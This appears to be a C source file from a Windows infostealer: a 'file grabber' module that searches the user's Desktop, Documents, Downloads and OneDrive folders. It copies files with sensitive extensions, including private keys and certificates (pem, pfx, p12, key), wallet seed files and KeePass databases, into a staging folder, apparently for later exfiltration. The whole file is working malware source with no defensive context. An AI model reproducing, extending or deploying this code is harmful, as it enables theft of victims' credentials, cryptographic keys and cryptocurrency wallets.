#include "grabber.h"
#include "config.h"
#include <windows.h>

#ifdef ENABLE_FILE_GRABBER
#include <string.h>
#include <stdio.h>
#include <ctype.h>

#define GRAB_MAX_PATH 512
#define GRAB_READ_BUF (256 * 1024)
#define GRAB_MAX_SIZE (10 * 1024 * 1024) /* 10 MB */

/* Target extensions (case-insensitive) */
static const char *target_exts[] = {
    "txt", "doc", "docx", "pdf",
    "key", "pem", "p12", "pfx",
    "seed", "json", "csv", "kdbx",
    NULL
};

static int has_target_ext(const char *name) {
    const char *dot = strrchr(name, '.');
    if (!dot) return 0;
    dot++;
    for (int i = 0; target_exts[i]; i++) {
        if (_stricmp(dot, target_exts[i]) == 0)
            return 1;
    }
    return 0;
}

/* Copy a single file from src to dst using Win32 API */
static int copy_file(const char *src, const char *dst) {
    HANDLE hIn = CreateFileA(src, GENERIC_READ, FILE_SHARE_READ,
                             NULL, OPEN_EXISTING, 0, NULL);
    if (hIn == INVALID_HANDLE_VALUE) return -1;

    DWORD fileSize = GetFileSize(hIn, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0 || fileSize > GRAB_MAX_SIZE) {
        CloseHandle(hIn);
        return -1;
    }

    char *buf = (char *)HeapAlloc(GetProcessHeap(), 0, fileSize);
    if (!buf) {
        CloseHandle(hIn);
        return -1;
    }

    DWORD read = 0;
    BOOL ok = ReadFile(hIn, buf, fileSize, &read, NULL);
    CloseHandle(hIn);
    if (!ok || read == 0) {
        HeapFree(GetProcessHeap(), 0, buf);
        return -1;
    }

    HANDLE hOut = CreateFileA(dst, GENERIC_WRITE, 0,
                              NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE) {
        HeapFree(GetProcessHeap(), 0, buf);
        return -1;
    }

    DWORD written = 0;
    ok = WriteFile(hOut, buf, read, &written, NULL);
    CloseHandle(hOut);
    HeapFree(GetProcessHeap(), 0, buf);
    return ok ? 0 : -1;
}

/* Scan a single directory and copy matching files */
static int scan_dir(const char *dir, const char *output_dir, size_t *count, size_t max_files) {
    char pattern[GRAB_MAX_PATH];
    snprintf(pattern, sizeof(pattern), "%s\\*", dir);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return -1;

    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        if (*count >= max_files) break;
        if (!has_target_ext(fd.cFileName)) continue;

        /* Skip files larger than 10 MB */
        DWORD hi = fd.nFileSizeHigh;
        DWORD lo = fd.nFileSizeLow;
        if (hi > 0 || lo > GRAB_MAX_SIZE) continue;

        char src_path[GRAB_MAX_PATH];
        snprintf(src_path, sizeof(src_path), "%s\\%s", dir, fd.cFileName);

        char dst_path[GRAB_MAX_PATH];
        snprintf(dst_path, sizeof(dst_path), "%s\\%s", output_dir, fd.cFileName);

        if (copy_file(src_path, dst_path) == 0)
            (*count)++;

    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
    return 0;
}

int grabber_collect(const char *output_dir, size_t max_files) {
    if (!output_dir || max_files == 0) return -1;

    /* Create output directory if it doesn't exist */
    CreateDirectoryA(output_dir, NULL);

    const char *home = getenv("USERPROFILE");
    if (!home) home = getenv("HOME");
    if (!home) return -1;

    const char *dirs[] = {
        "Desktop", "Documents", "Downloads",
        "OneDrive\\Desktop", "OneDrive\\Documents", "OneDrive\\Downloads",
        NULL
    };

    size_t count = 0;
    for (int i = 0; dirs[i]; i++) {
        if (count >= max_files) break;
        char dirpath[GRAB_MAX_PATH];
        snprintf(dirpath, sizeof(dirpath), "%s\\%s", home, dirs[i]);
        scan_dir(dirpath, output_dir, &count, max_files);
    }

    return (int)count;
}

#endif /* ENABLE_FILE_GRABBER */
